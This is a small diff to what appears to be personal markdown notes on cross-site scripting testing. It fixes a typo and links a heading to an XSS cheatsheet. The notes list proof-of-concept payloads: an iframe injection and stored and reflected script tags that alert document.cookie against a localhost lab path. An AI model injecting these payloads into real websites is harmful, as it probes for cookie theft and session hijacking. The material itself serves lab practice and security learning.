@@ -6,12 +6,12 @@
 ```
 
 iframe: `<iframe src="http://www.cnn.com"></iframe>`  
-Stored cookie: `<script>alert(document.cookie)</script>`
-Refleced (vulnerable parameter): `http://localhost/xss_r/?name=<script>alert(document.cookie)</script`
+Stored cookie: `<script>alert(document.cookie)</script>`  
+Reflected (vulnerable parameter): `http://localhost/xss_r/?name=<script>alert(document.cookie)</script`
 
 
-Cheatsheet
-----------
+[Cheatsheet](http://ha.ckers.org/xss.html)
+------------------------------------------
 
 XSS locator:
 
